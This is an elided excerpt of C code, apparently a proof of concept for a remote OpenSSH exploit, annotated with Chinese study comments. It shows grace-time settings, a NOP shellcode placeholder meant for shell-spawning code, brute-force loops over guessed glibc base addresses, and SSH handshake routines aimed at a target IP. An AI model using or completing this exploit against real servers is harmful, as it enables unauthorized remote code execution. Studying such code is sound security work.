...
#define MAX_PACKET_SIZE (256 * 1024)   //通常用于定义网络通信中单个数据包的最大尺寸。
#define LOGIN_GRACE_TIME 120          //这个时间内用户可以完成登录过程。
#define MAX_STARTUPS 100                //能用于限制程序启动时可以创建的最大进程数或线程数。
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)  //这行定义了一个宏CHUNK_ALIGN，它接受一个参数s。这个宏的目的是将任意大小s的内存块对齐到16字节的倍数。它通过以下步骤实现：
...
//在这里，\x90\x90\x90\x90作为shellcode的占位符，实际使用时应该替换为实现特定功能的代码，比如创建一个shell会话、执行系统命令等。
...
//设置随机数种子
  ...
  for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) //遍历0xb7200000, 0xb7400000这两个地址
    {
      ...
      for (int attempt = 0; attempt < 20000 && !success; attempt++)         //尝试循环两万次
        {
          if (attempt % 1000 == 0)
            {
          ...
          int sock = setup_connection (ip, port);                                 //  返回sock
          if (sock < 0)
            {
...
{
  int sock = socket (AF_INET, SOCK_STREAM, 0);//这行代码创建了一个基于 IPv4 地址族的 TCP 流式套接字，
  ...
  server_addr.sin_port = htons (port);// 设置端口号，htons函数将端口号转换为网络字节序
  ...
  struct sockaddr_in {
    ...
    uint8_t sin_zero[8];       // 保留区域，必须填充为0
};
  */
  if (inet_pton (AF_INET, ip, &server_addr.sin_addr) <= 0)   //写入ip  特定格式
    {
      perror ("inet_pton");
      close (sock);
      return -1;
  ...
  if (connect (sock, (struct sockaddr *)&server_addr, sizeof (server_addr))  //链接
      < 0)
    {
      perror ("connect");
      close (sock);
  ...
  fcntl (sock, F_SETFL, flags | O_NONBLOCK);  //设置非阻塞模式。
...
receive_ssh_version (int sock)
{
  ...
  while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN)); //监听，接受

  if (received > 0)                                                       //  接收到就输出接受内容
    {
      buffer[received] = '\0';
...
perform_ssh_handshake (int sock)
{
  ...
  if (receive_ssh_version (sock) < 0)
    return -1;
  send_kex_init (sock); 
  if (receive_kex_init (sock) < 0)      //  发送并且接受一个密钥交换初始化（kexinit）包
    return -1;
  return 0;
}
